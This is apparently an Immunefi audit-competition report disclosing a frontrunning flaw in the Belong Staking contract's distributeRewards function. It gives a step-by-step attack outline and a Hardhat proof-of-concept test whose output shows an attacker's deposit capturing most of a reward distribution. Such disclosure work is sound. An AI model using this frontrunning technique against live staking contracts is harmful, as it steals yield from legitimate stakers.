# 57786 sc high malicious users can frontrun staking distributerewards to claim majority of rewards

**Submitted on Oct 28th 2025 at 21:15:40 UTC by @Josh4324 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* Report ID: #57786
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* Impacts:
  * Theft of unclaimed yield

## Description

### Brief / Intro

The Staking contract's `distributeRewards` function is vulnerable to a frontrunning attack. A malicious user with access to large deposits can monitor the mempool for pending reward distributions, frontrun by depositing a substantial amount of LONG tokens to mint shares at the pre-reward rate, and then capture a disproportionate share of the rewards upon distribution.

This dilutes rewards for existing stakers and allows the attacker to profit by withdrawing post-rebase. The issue arises from the lack of protections against sudden share inflation before rewards.

### Vulnerability Details

The vulnerable function:

```sol
function distributeRewards(uint256 amount) external onlyOwner {
    if (amount == 0) revert ZeroReward();
    LONG.safeTransferFrom(msg.sender, address(this), amount);
    emit RewardsDistributed(amount);
}
```

`distributeRewards(uint256 amount)` adds rewards by transferring LONG into the vault, increasing `totalAssets()` without minting new shares, which rebases the asset-per-share rate upward for existing holders.

There is no protection against frontrunning: an attacker can deposit a large amount just before the reward tx confirms, minting shares at the lower pre-reward rate, and then benefit from the rebase on their inflated share count. Upon withdrawal, the attacker realizes gains proportional to their temporary dominance in total shares, effectively stealing from legitimate stakers.

### Attack Vector

{% stepper %}
{% step %}

### Monitor mempool

Observe a pending `distributeRewards` transaction in the mempool.
{% endstep %}

{% step %}

### Frontrun with deposit

Frontrun by depositing a large amount of LONG to the staking contract, minting shares at the pre-reward rate.
{% endstep %}

{% step %}

### Let rewards rebase

Allow the reward transaction to execute, increasing assets in the vault without minting shares, which increases the asset-per-share value.
{% endstep %}

{% step %}

### Withdraw amplified assets

Redeem shares after the rebase to capture a disproportionate amount of the distributed rewards.
{% endstep %}
{% endstepper %}

### Conditions for Exploitation

* Pending `distributeRewards` tx visible in mempool.
* Attacker has access to large LONG liquidity (e.g., flash loans).
* Attacker may have to wait minStakePeriod if required, but profit can still exceed delay.

## Impact Details

{% hint style="danger" %}
Attackers can steal expected yield from long-term stakers by capturing a disproportionate share of each distribution through frontrunning deposits.
{% endhint %}

## References

<https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol#L156>

## Proof of Concept

Run the provided test in `test/v2/platform/file.test.ts`. Example test (Hardhat):

```ts
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import { LONG, Staking } from '../../../typechain-types';
import { getPercentage } from '../../../helpers/math';
import { deployLONG, deployStaking } from '../../../helpers/deployFixtures';

describe('Staking', () => {
  async function fixture() {
    const [admin, treasury, pauser, minter, burner, user1, user2, user3, user4] = await ethers.getSigners();

    const long: LONG = await deployLONG(admin.address, admin.address, pauser.address);
    const staking: Staking = await deployStaking(admin.address, treasury.address, long.address);

    return {
      admin,
      treasury,
      pauser,
      minter,
      burner,
      user1,
      user2,
      user3,
      user4,
      long,
      staking,
    };
  }

  describe('Rewards distribution', () => {
    it('attack test', async () => {
      const { staking, long, admin, user1, user2, user3 } = await loadFixture(fixture);

      const a1 = ethers.utils.parseEther('3000');
      const a2 = ethers.utils.parseEther('3000');
      const a3 = ethers.utils.parseEther('10000');
      const reward = ethers.utils.parseEther('1000');

      // deposits
      await long.connect(admin).transfer(user1.address, a1);
      await long.connect(admin).transfer(user2.address, a2);
      await long.connect(admin).transfer(user3.address, a3);
      await long.connect(user1).approve(staking.address, a1);
      await long.connect(user2).approve(staking.address, a2);
      await staking.connect(user1).deposit(a1, user1.address);
      await staking.connect(user2).deposit(a2, user2.address);

      const block = await ethers.provider.getBlock('latest');
      await ethers.provider.send('evm_setNextBlockTimestamp', [block.timestamp + 86400]);

      // Frontrun distribute rewards with user3 deposit
      await long.connect(user3).approve(staking.address, a3);
      await staking.connect(user3).deposit(a3, user3.address);

      await long.connect(admin).approve(staking.address, reward);
      await staking.connect(admin).distributeRewards(reward);

      await staking.connect(admin).setMinStakePeriod(1);

      // user1
      const s1 = await staking.balanceOf(user1.address);
      const exp1 = await staking.previewRedeem(s1);
      await staking.connect(user1).redeem(s1, user1.address, user1.address);

      // user2
      const s2 = await staking.balanceOf(user2.address);
      const exp2 = await staking.previewRedeem(s2);
      await staking.connect(user2).redeem(s2, user2.address, user2.address);

      // user3
      const s3 = await staking.balanceOf(user3.address);
      const exp3 = await staking.previewRedeem(s3);
      await staking.connect(user3).redeem(s3, user3.address, user3.address);

      console.log('user 1', ethers.utils.formatEther(exp1));
      console.log('user 2', ethers.utils.formatEther(exp2));
      console.log('attacker', ethers.utils.formatEther(exp3));
    });
  });
});
```

To run:

yarn test test/v2/platform/file.test.ts

<details>

<summary>Test output (example)</summary>

```
  Staking
    Rewards distribution
Warning: Potentially unsafe deployment of contracts/v2/periphery/Staking.sol:Staking

    You are using the `unsafeAllow.constructor` flag.

user 1 3187.499999999999999999
user 2 3187.5
attacker 10625.0
      ✔ attack test (3474ms)
```

</details>
